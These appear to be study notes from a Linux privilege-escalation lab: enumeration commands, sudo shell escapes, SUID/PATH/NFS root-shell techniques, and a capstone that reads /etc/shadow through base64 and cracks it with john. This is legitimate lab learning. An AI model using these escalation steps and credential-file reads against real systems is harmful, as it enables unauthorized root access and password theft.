- Identifying the system and environment (e.g., `hostname`, `uname -a`, `/etc/issue`)
- Reviewing running processes and permissions (e.g., `ps`, `id`, `sudo -l`)
- Investigating users, files, and history (e.g., `ls -la`, `/etc/passwd`, `history`)
- Exploring the network setup and connections (e.g., `ifconfig`, `netstat`, `ip route`)
- Locating tools, binaries, and sensitive files (e.g., `find`, `env`)

| **Command**                  | **Description**                                                                                              |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------ |
| `hostname`                   | Displays system hostname; can hint at machine's role (e.g., SQL-PROD-01).                                    |
| `uname -a`                   | Shows detailed system and kernel information.                                                                |
| `/proc/version`              | Provides kernel version and compiler info (via procfs). (`cat /proc/version`)                                |
| `/etc/issue`                 | Displays OS version (can be customized).(`cat /etc/issue`)                                                   |
| `ps -A`, `ps aux`, `ps axjf` | Lists running processes, users, and process trees.                                                           |
| `env`                        | Shows environment variables like `PATH` which may include useful binaries.                                   |
| `sudo -l`                    | Lists commands the user can run with elevated privileges via `sudo`.                                         |
| `ls -la`                     | Lists files in a directory, showing hidden and permission details.                                           |
| `id`                         | Displays user ID, group ID, and group memberships.                                                           |
| `/etc/passwd`                | Lists system users; useful for enumeration and brute-force targeting. (`cat /etc/passwd \| cut -d "." -f 1`) |
| `history`                    | Shows previously executed commands; may expose credentials.                                                  |
| `ifconfig`                   | Displays network interfaces and IP addresses.                                                                |
| `ip route`                   | Reveals routing table and potential reachable networks.                                                      |
| `netstat -a/n/l/tp/s/i`      | Shows open ports, connections, network statistics, and interface data.                                       |
| `find`                       | Searches files by name, size, permissions, timestamps, or ownership.                                         |
| `find / -perm -u=s`          | Locates files with the SUID bit set (potential privilege escalation).                                        |
| `find / -writable -type d`   | Finds world-writable directories.                                                                            |
| `find / -name python*`       | Finds installed development tools or interpreters.                                                           |

# Kernel Exploit
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system. Ex: [exploit-db](https://www.exploit-db.com/)
3. Run the exploit 

# Sudo 
In order to exploiting sudo users, first you need to find which commands current user is allowed, using the **_sudo -l_** command
```sh
#Example
User andrea may run the following commands on viserion:
 (root) NOPASSWD: /usr/bin/find
 (root) NOPASSWD: /usr/bin/vim
 (root) NOPASSWD: /usr/bin/awk
```

```sh
andrea@viserion:~$ sudo find /etc/passwd -exec /bin/sh \;
# whoami
root
```

or the **-c** paramether of **vim**:

```sh
andrea@viserion:~$ sudo vim -c '!sh'
# whoami
root
```

```sh
Also **awk** allows the invocation of a shell:

andrea@viserion:~$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami
root
```

and **less**, **more** and **man** allows command execution:

 ## MISCELLANEOUS COMMANDS

```sh
-<flag> Toggle a command line option [see OPTIONS below].
 --<name> Toggle a command line option, by name.
 _<flag> Display the setting of a command line option.
 __<name> Display the setting of an option, by name.
 +cmd Execute the less cmd each time a new file is examined.
 **!command Execute the shell command with $SHELL.**
 |Xcommand Pipe file between current pos & mark X to shell command.
 v Edit the current file with $VISUAL or $EDITOR.
 V Print version number of "less".
```
So, simply call:

```sh
sudo less /etc/hosts
# or
sudo more /etc/hosts
# or
sudo man ls
```

Then press _**!sh**_ and hit enter.

# SUID
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
Search info on [GTFOBins](https://gtfobins.github.io)
# Capabilities
1. `getcap -r / 2>/dev/null`
2. [GTFOBins](https://gtfobins.github.io)
# Cron 
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
# Path 
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
1. Searching writable folders
2. Export that folder to PATH
Ex:
	The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.
3. Place a malicious binary in writable folder:
```sh
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
```
4. Run
```sh
./path
```
# NFS
NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users. The critical element for this privilege escalation vector is the **“no_root_squash”** option.
If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

1. Check for NFS shares from your machine:
```sh
showmount -e IP
```
2. Mount the NFS share to your local directory:
```sh
mount -t nfs <target-ip>:/shared /mnt/nfs
```
3. Create a simple C program to spawn a root shell (`nfs.c`):
```sh
#include <stdio.h>
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash");
    return 0;
}

```
4. Compile the binary and set the SUID bit:
```sh
gcc nfs.c -o nfs
chmod +s nfs
```
5. Ensure the file is in the NFS-mounted folder.
The binary will now appear on the target system (due to shared mount).
6. Execute the SUID binary on the target to gain root
`./nfs`
# Capstone Challenge
## Enumeration
```sh
hostname   
sudo -l   
cat /etc/passwd   
uname-a
```

Ex:
We know the hostname, the kernel version of the system, that leonard can’t run any sudo commands and that there is another user “missy”.
**Kernel Exploits** — for this kernel we need to look for the exploit.db but I was unable to find any valid exploit
**sudo** — no sudo can be run by leonard which we have checked by `sudo -l`
## SUID
To exploit SUID we need to find if any of the programs are wrongly configured, run this to check if any file can be run with root privileges
`find / -type f -perm -04000 -ls 2>/dev/null`
In this case, Base64
Check GTFOBins
```sh
LFILE=/etc/shadow
/bin/base64 "$LFILE" | base64 --decode
```
## Store hash and decrypt 
Store it on a txt and:
```sh
john file.txt
```